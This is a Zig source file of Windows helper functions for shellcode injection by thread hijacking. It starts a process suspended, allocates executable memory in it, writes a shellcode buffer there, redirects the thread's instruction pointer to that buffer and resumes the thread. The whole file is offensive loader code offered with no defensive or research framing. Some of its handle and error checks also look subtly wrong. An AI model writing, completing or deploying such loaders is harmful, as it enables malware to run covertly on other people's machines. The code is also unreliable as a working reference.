const std = @import("std");
const main = @import("main.zig");
const windows = std.os.windows;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const CONTEXT = windows.CONTEXT;
const kernel32 = windows.kernel32;
const PVOID = windows.PVOID;
const CREATE_SUSPENDED = 0x00000004;
const STARTUPINFOW = windows.STARTUPINFOW;
const PROCESS_INFORMATION = windows.PROCESS_INFORMATION;
extern "kernel32" fn GetThreadContext(h_thread: HANDLE, lp_context: ?*CONTEXT) callconv(.winapi) BOOL;
extern "kernel32" fn SetThreadContext(h_thread: HANDLE, lp_context: ?*CONTEXT) callconv(.winapi) BOOL;
extern "kernel32" fn ResumeThread(h_thread: HANDLE) callconv(.winapi) DWORD;
extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: windows.SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(.winapi) LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: ?LPVOID, lpBuffer: [*]const u8, nSize: windows.SIZE_T, lpNumberOfBytesWritten: ?*windows.SIZE_T) callconv(.winapi) BOOL;
extern "kernel32" fn VirtualProtectEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: windows.SIZE_T, flNewProtect: DWORD, lpflOldProtect: ?*DWORD) callconv(.winapi) BOOL;
//pub extern "kernel32" fn CreateRemoteThread(h_process: HANDLE, lp_thread_attributes: ?*anyopaque, dw_stack_size: DWORD, lp_start_address: LPVOID, lp_parameter: ?*anyopaque, dw_creation_flags: DWORD, lp_thread_id: ?*DWORD) callconv(windows.WINAPI) HANDLE;

pub fn suspended_Process(lp_process_name: ?[*:0]u16, dwProcId: *DWORD, h_process: *HANDLE, h_thread: *HANDLE) !bool {
    var SI: STARTUPINFOW = undefined;
    var PI: PROCESS_INFORMATION = undefined;

    SI.cb = @sizeOf(STARTUPINFOW);
    //const allocator = std.heap.page_allocator;
    //var AppName = std.unicode.utf8ToUtf16LeWithNull(allocator, lp_process_name) catch undefined;

    if (kernel32.CreateProcessW(null, lp_process_name, null, null, windows.FALSE, CREATE_SUSPENDED, null, null, &SI, &PI) == windows.FALSE) {
        return false;
    }
    //defer allocator.free(AppName);

    dwProcId.* = PI.dwProcessId;
    h_process.* = PI.hProcess;
    h_thread.* = PI.hThread;

    defer _ = windows.CloseHandle(PI.hProcess);
    defer _ = windows.CloseHandle(PI.hThread);

    if (dwProcId.* != 0 and h_process.* != windows.INVALID_HANDLE_VALUE and h_thread.* != windows.INVALID_HANDLE_VALUE) {
        return true;
    }

    return false;
}

pub fn inject_into_Process(h_process: *HANDLE, Shellcode: [*]const u8, ShellcodeSize: usize, PAddr: *PVOID) !bool {
    var NumberofWrittenBytes: windows.SIZE_T = undefined;
    var OldProtection: DWORD = undefined;

    // kernel32.VirtualAlloc(lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD)
    PAddr.* = VirtualAllocEx(@ptrCast(h_process), null, ShellcodeSize, windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE);
    if (PAddr.* == windows.INVALID_HANDLE_VALUE) {
        std.debug.print("VirtualAllocEx failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    if (WriteProcessMemory(@ptrCast(h_process), PAddr.*, Shellcode, ShellcodeSize, &NumberofWrittenBytes) == windows.FALSE) {
        return false;
    }
    if (VirtualProtectEx(@ptrCast(h_process), PAddr.*, ShellcodeSize, windows.PAGE_EXECUTE_READ, &OldProtection) == windows.FALSE) {
        return false;
    }

    return true;
}

pub fn hijackremoteThread(h_thread: *HANDLE, Addr: windows.PVOID) !bool {
    var ctx: CONTEXT = undefined;
    ctx.ContextFlags = main.CONTEXT_CONTROL;

    // GET THREAD CONTEXT

    if (GetThreadContext(h_thread.*, &ctx) == windows.FALSE) {
        return false;
    }
    ctx.Rip = @intFromPtr(Addr);

    if (SetThreadContext(h_thread.*, &ctx) == windows.FALSE) {
        return false;
    }

    _ = ResumeThread(h_thread.*);

    return true;
}
